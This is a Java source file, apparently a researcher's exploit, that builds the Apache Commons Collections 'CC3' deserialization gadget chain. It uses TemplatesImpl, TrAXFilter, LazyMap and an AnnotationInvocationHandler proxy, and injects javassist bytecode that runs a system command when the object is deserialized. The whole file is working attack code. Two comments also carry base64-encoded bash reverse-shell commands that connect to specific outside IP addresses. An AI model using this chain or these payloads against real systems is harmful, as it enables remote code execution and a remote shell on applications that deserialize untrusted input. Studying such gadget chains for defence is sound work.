package CC3ysoEXP;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

// CC3 链最终 EXP，用 CC1 链的前半部分
public class CC3FinalEXP1 {
    public static void main(String[] args) throws Exception
    {
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Drunkbaby");

        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        // new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzkuMC4xNjQvMTIzNiAwPiYx}|{base64,-d}|{bash,-i}\"}"
        byte[] evil = getTemplatesImpl("Calc");
        byte[][] codes = {evil};
        bytecodesField.set(templates,codes);

//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
//        tfactoryField.setAccessible(true);
//        tfactoryField.set(templates, new TransformerFactoryImpl());
        //    templates.newTransformer();

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
                new Object[]{templates});
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                , new Class[]{Map.class}, invocationHandler);
        Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static byte[] getTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody(" try {\n" +
                    " Runtime.getRuntime().exec(\"" + cmd +
                    "\");\n" +
                    " } catch (Exception ignored) {\n" +
                    " }");
            // "new String[]{\"/bin/bash\", \"-c\", \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx}|{base64,-d}|{bash,-i}\"}"
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
}
